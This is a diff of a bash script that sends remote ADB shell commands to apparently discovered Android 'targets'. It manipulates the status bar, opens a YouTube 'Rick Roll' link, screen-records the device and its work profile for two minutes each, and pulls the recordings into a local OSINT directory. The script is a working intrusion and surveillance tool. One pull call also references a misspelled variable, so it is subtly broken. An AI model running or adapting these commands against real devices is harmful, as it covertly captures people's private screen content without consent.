@@ -147,20 +147,71 @@ function send_remote_adb_shell_command {
 	#echo -e "\tPrint Rest of array ${'$@':2}"
 	#echo -e "\tPrint Rest of Array ${function_input[@]}"
 	# Debugging line for this function
-	#echo -e "\tADB Target:\t[\t$adb_target_id\t]\n\tADB Command:\t[\t$adb_command\t]"
+	echo -e "\tADB Target:\t[\t$adb_target_id\t]\n\tADB Command:\t[\t$adb_command\t]\n\tFull Command:\t adb -s $adb_target_id shell $adb_command"
 	# Send the command
 	adb -s $adb_target_id shell $adb_command
 }
 
+# Function for extracting a given file < Target > to a given < Location >
+function pull_remote_file_adb_shell {
+	# Placing the function input into a local variable
+	local var function_input=($@)
+	# Extract the adb_target_id from the function input
+	local var adb_target_id=${function_input[0]}
+	# Extract the rest of the pull file < Target > and (if provided) < Location >
+	local var adb_pull_target_and_location=${function_input[@]:1}
+	# Debug output showing pull command sent
+	echo -e "Input to Function:\t${function_input[*]}"
+	echo -e "[*] Calling pull:\t$adb_pull_target_and_location\n\tADB Target:\t[ $adb_target_id ]\n\tFull Command:\tadb -s $adb_target_id pull $adb_pull_target_and_location"
+	# Pull the file using provided command
+	adb -s $adb_target_id pull $abd_pull_target_and_location
+}
 
 # Function for testing shell interaction with the target android id
 function test_shell_interaction {
 	local var adb_target_id=$1
+	local var adb_pull_location_directory=$2
+	local var screen_recording_filename="general_screen_recording_0001.mp4"
+	local var work_profile_screen_recording_filename="work_profile_screen_recording_0001.mp4"
+	local var android_device_screen_recording_directory="/sdcard/"
+	# Note: The below value is in seconds; the default for time limit is 180 seconds (three minutes), unless specified
+	local var screen_record_time_limit=120
 	echo -e "================================================================================"
 	echo -e "[*] Testing Interaction with the ADB Android Target ID\t-\t[\t$adb_target_id\t]"
 	echo -e "--------------------------------------------------------------------------------"
+	echo -e "Input to Function:\t$@"
 	echo -e "[*] Attempt to move the status bar up and down"
-	adb -s $adb_target_id 
+	# Testing opening and closing the Android Status Bar
+	send_remote_adb_shell_command $adb_target_id service call statusbar 1
+	sleep 0.5
+	send_remote_adb_shell_command $adb_target_id service call statusbar 2
+	sleep 0.5
+	## Try to open a web browser
+	echo -e "[*] Attempt to Rick Roll the User"
+	# Go back to home
+	send_remote_adb_shell_command $adb_target_id input keyevent 3
+	sleep 1
+	# Open a web browser
+	#send_remote_adb_shell_command $adb_target_id input keyevent 64
+	#sleep 2
+	# Highlight the Web URL Bar
+	#send_remote_adb_shell_command $adb_target_id input keyevent 
+	# Open Browser with Specific URL via Activity Manager
+	send_remote_adb_shell_command $adb_target_id am start -a android.intent.action.VIEW -d https://www.youtube.com/watch?v=dQw4w9WgXcQ
+	## Begin Screen Recording / Capture Testing
+	echo -e "[*] Beginning Generic Screen Recording..."
+	# Screen capture (time is in seconds?)
+	send_remote_adb_shell_command $adb_target_id screenrecord --time-limit $screen_record_time_limit $android_device_screen_recording_directory$screen_recording_filename
+	sleep 120
+	#adb -s $adb_target_id pull /sdcard/screenrecord-003.mp4 ./.
+	# Note: Below the addition of the '/' character seems to be how to differentiate between two bash variables; BUT NOT with the screenrecord commands?? Why....
+	#	-> Maybe not???
+	pull_remote_file_adb_shell $adb_target_id $android_device_screen_recording_directory$screen_recording_filename $adb_pull_location_directory
+	echo -e "[*] Beginning Work Profile Screen Recording...."
+	send_remote_adb_shell_command $adb_target_id screenrecord --time-limit $screen_record_time_limit $android_device_screen_recording_directory$work_profile_screen_recording_filename
+	sleep $screen_record_time_limit
+	pull_remote_file_adb_shell $adb_target_id $android_device_screen_recording_directory$work_profile_screen_recording_filename $adb_pull_location_directory
+	#adb -s $adb_target_id 
 }
 
 ### Main Script
@@ -229,26 +280,8 @@ for adb_target in $potential_adb_targets; do
 	#osint_explore_adb_target $adb_target_id
 	# Testing Return of Network Information
 	#send_remote_adb_shell_command $adb_target_id ip addr show
-	# Testing opening and closing the Android Status Bar
-	send_remote_adb_shell_command $adb_target_id service call statusbar 1
-	sleep 0.5
-	send_remote_adb_shell_command $adb_target_id service call statusbar 2
-	sleep 0.5
-	## Try to open a web browser
-	# Go back to home
-	send_remote_adb_shell_command $adb_target_id input keyevent 3
-	sleep 1
-	# Open a web browser
-	#send_remote_adb_shell_command $adb_target_id input keyevent 64
-	#sleep 2
-	# Highlight the Web URL Bar
-	#send_remote_adb_shell_command $adb_target_id input keyevent 
-	# Open Browser with Specific URL via Activity Manager
-	send_remote_adb_shell_command $adb_target_id am start -a android.intent.action.VIEW -d https://www.youtube.com/watch?v=dQw4w9WgXcQ
-	# Screen capture (time is in seconds?)
-	send_remote_adb_shell_command $adb_target_id screenrecord --time-limit 120 /sdcard/screenrecord-003.mp4
-	sleep 120
-	adb -s $adb_target_id pull /sdcard/screenrecord-003.mp4 ./.
+	# Call to the test interaction function
+	test_shell_interaction $adb_target_id $osint_directory_location
 done
 
 
